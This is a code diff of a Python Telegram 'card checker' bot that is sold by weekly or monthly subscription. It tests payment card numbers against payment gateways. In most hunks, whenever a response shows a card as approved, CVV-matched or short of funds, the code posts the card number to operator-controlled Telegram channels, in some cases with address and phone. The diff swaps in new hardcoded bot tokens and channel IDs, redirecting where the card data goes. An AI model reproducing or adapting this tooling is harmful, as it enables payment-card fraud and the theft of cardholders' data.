@@ -13,7 +13,7 @@ from faker import Faker
 from multiprocessing import Process
 import threading
 stopuser = {}
-token = '7353552050:AAFNcVfi8bG1DVbFWmBos-uPNMrR8IxTsEw'
+token = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
 bot=telebot.TeleBot(token,parse_mode="HTML")
 admin=7427691214
 f = Faker()
@@ -65,21 +65,6 @@ def start(message):
 𝑰𝑭 𝒀𝑶𝑼 𝑾𝑨𝑵𝑻 𝑻𝑶 𝑼𝑺𝑬 𝑰𝑻, 𝒀𝑶𝑼 𝑴𝑼𝑺𝑻 𝑷𝑼𝑹𝑪𝑯𝑨𝑺𝑬 𝑨 𝑾𝑬𝑬𝑲𝑳𝒀 𝑶𝑹 𝑴𝑶𝑵𝑻𝑯𝑳𝒀 𝑺𝑼𝑩𝑺𝑪𝑹𝑰𝑷𝑻𝑰𝑶𝑵 
 
 𝑻𝑯𝑬 𝑩𝑶𝑻'𝑺 𝑱𝑶𝑩 𝑰𝑺 𝑻𝑶 𝑪𝑯𝑬𝑪𝑲 𝑪𝑨𝑹𝑫𝑺
-
-𝑩𝑶𝑻 𝑺𝑼𝑩𝑺𝑪𝑹𝑰𝑷𝑻𝑰𝑶𝑵 𝑷𝑹𝑰𝑪𝑬𝑺:
- 
-𝗘𝗚𝗬𝗣𝗧 🇪🇬
-1 𝗪𝗘𝗘𝗞 > 250𝗘𝗚
-1 𝗠𝗢𝗡𝗧𝗛 > 600𝗘𝗚
-━━━━━━━━━━━━
-𝗜𝗥𝗔𝗤 🇮🇶
-1 𝗪𝗘𝗘𝗞 » 6 𝗔𝗦𝗜𝗔 
-1 𝗠𝗢𝗡𝗧𝗛 » 13 𝗔𝗦𝗜𝗔
-━━━━━━━━━━━━
-𝗪𝗢𝗥𝗟𝗗𝗪𝗜𝗗𝗘 » 𝗨𝗦𝗗𝗧 🌍
-1 𝗪𝗘𝗘𝗞 » 6$ 
-1 𝗠𝗢𝗡𝗧𝗛 » 13$
-━━━━━━━━━━━━
 
 𝑪𝑳𝑰𝑪𝑲 /𝑪𝑴𝑫𝑺 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺
 
@@ -361,8 +346,8 @@ def menu_callback(call):
 ◆ 𝑩𝒀: @YourExDestiny
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 					if 'success' in last:
-						tok = '7329871433:AAE59jRhQRTxFYc_rJ6k13GVia2fRXHfgAw'
-						acc =  '-1002111411217'
+						tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
+						acc =  '-1002237336934'
 						mg = f"""<b> 
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
@@ -382,8 +367,8 @@ def menu_callback(call):
 						ch += 1
 						bot.send_message(call.from_user.id, msg)
 					elif "funds" in last:
-						tok = '7329871433:AAE59jRhQRTxFYc_rJ6k13GVia2fRXHfgAw'
-						acc =  '-1002111411217'
+						tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
+						acc =  '-1002237336934'
 						mg = f"""<b> 
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
@@ -403,8 +388,8 @@ def menu_callback(call):
 						bot.send_message(call.from_user.id, msgf)
 						live+=1
 					elif "card's security" in last:
-						tok = '7329871433:AAE59jRhQRTxFYc_rJ6k13GVia2fRXHfgAw'
-						acc =  '-1002111411217'
+						tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
+						acc =  '-1002237336934'
 						mg = f"""<b> 
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
@@ -542,8 +527,8 @@ def menu_callback(call):
 𝗕𝗼𝘁 𝗕𝘆: @YourExDestiny</b>'''
 
 					if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
-						tok = '7329871433:AAE59jRhQRTxFYc_rJ6k13GVia2fRXHfgAw'
-						acc =  '-1002111411217'
+						tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
+						acc =  '-1002237336934'
 						mg = f"""<b> 
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
@@ -566,8 +551,8 @@ def menu_callback(call):
 						risk+=1
 						bot.send_message(call.from_user.id, risk)
 					elif 'CVV' in last:
-						tok = '7329871433:AAE59jRhQRTxFYc_rJ6k13GVia2fRXHfgAw'
-						acc =  '-1002111411217'
+						tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
+						acc =  '-1002237336934'
 						mg = f"""<b> 
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
@@ -780,8 +765,8 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ◆ 𝑩𝒀: @YourExDestiny
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 	if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'live' in last:
-		tok = '7329871433:AAE59jRhQRTxFYc_rJ6k13GVia2fRXHfgAw'
-		acc =  '-1002111411217'
+		tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
+		acc =  '-1002237336934'
 		mg = f"""<b> 
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
@@ -796,7 +781,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 </b>"""
 		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
 		tlg_params = {"parse_mode": "HTML"}
-		tok = '7329871433:AAE59jRhQRTxFYc_rJ6k13GVia2fRXHfgAw'
+		tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
 		acb =  '-1002046977369'
 		mag = f"""<b>
 {cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
@@ -987,8 +972,8 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ⸙ 𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
 ⸙ 𝗕𝗼𝘁 𝗕𝘆: @YourExDestiny</b>'''
 	if "Funds" in last or 'Insufficient Funds' in last or 'avs' in last or '1000: Approved' in last or 'Duplicate' in last or 'Approved' in last:
-		tok = '7329871433:AAE59jRhQRTxFYc_rJ6k13GVia2fRXHfgAw'
-		acc =  '-1002111411217'
+		tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
+		acc =  '-1002237336934'
 		mg = f"""<b> 
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
@@ -1003,7 +988,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 </b>"""
 		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
 		tlg_params = {"parse_mode": "HTML"}
-		tok = '7329871433:AAE59jRhQRTxFYc_rJ6k13GVia2fRXHfgAw'
+		tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
 		acb =  '-1002046977369'
 		mag = f"""<b>
 {cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
@@ -1223,8 +1208,8 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ◆ 𝑩𝒀: @YourExDestiny
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 	if 'success' in last:
-		tok = '7329871433:AAE59jRhQRTxFYc_rJ6k13GVia2fRXHfgAw'
-		acc =  '-1002111411217'
+		tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
+		acc =  '-1002237336934'
 		mg = f"""<b> 
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
@@ -1239,7 +1224,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 </b>"""
 		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
 		tlg_params = {"parse_mode": "HTML"}
-		tok = '7329871433:AAE59jRhQRTxFYc_rJ6k13GVia2fRXHfgAw'
+		tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
 		acb =  '-1002046977369'
 		mag = f"""<b>
 {cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
@@ -1250,8 +1235,8 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 		i = requests.post(tlg, params=tlg_params)
 		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
 	elif "funds" in last:
-		tok = '7329871433:AAE59jRhQRTxFYc_rJ6k13GVia2fRXHfgAw'
-		acc =  '-1002111411217'
+		tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
+		acc =  '-1002237336934'
 		mg = f"""<b> 
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
@@ -1266,7 +1251,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 </b>"""
 		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
 		tlg_params = {"parse_mode": "HTML"}
-		tok = '7329871433:AAE59jRhQRTxFYc_rJ6k13GVia2fRXHfgAw'
+		tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
 		acb =  '-1002046977369'
 		mag = f"""<b>
 {cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
@@ -1277,8 +1262,8 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 		i = requests.post(tlg, params=tlg_params)
 		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgf)
 	elif "card's security" in last:
-		tok = '7329871433:AAE59jRhQRTxFYc_rJ6k13GVia2fRXHfgAw'
-		acc =  '-1002111411217'
+		tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
+		acc =  '-1002237336934'
 		mg = f"""<b> 
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
@@ -1293,7 +1278,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 </b>"""
 		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
 		tlg_params = {"parse_mode": "HTML"}
-		tok = '7329871433:AAE59jRhQRTxFYc_rJ6k13GVia2fRXHfgAw'
+		tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
 		acb =  '-1002046977369'
 		mag = f"""<b>
 {cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
@@ -1547,8 +1532,8 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ◆ 𝑩𝒀: @YourExDestiny
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 	if 'Authenticate Attempt Successful' in last or 'Authenticate Successful' in last or 'authenticate_successful' in last:
-		tok = '7329871433:AAE59jRhQRTxFYc_rJ6k13GVia2fRXHfgAw'
-		acc =  '-1002111411217'
+		tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
+		acc =  '-1002237336934'
 		mg = f"""<b> 
 ❆═══𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
@@ -1563,7 +1548,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 </b>"""
 		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
 		tlg_params = {"parse_mode": "HTML"}
-		tok = '7329871433:AAE59jRhQRTxFYc_rJ6k13GVia2fRXHfgAw'
+		tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
 		acb =  '-1002046977369'
 		mag = f"""<b>
 {cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
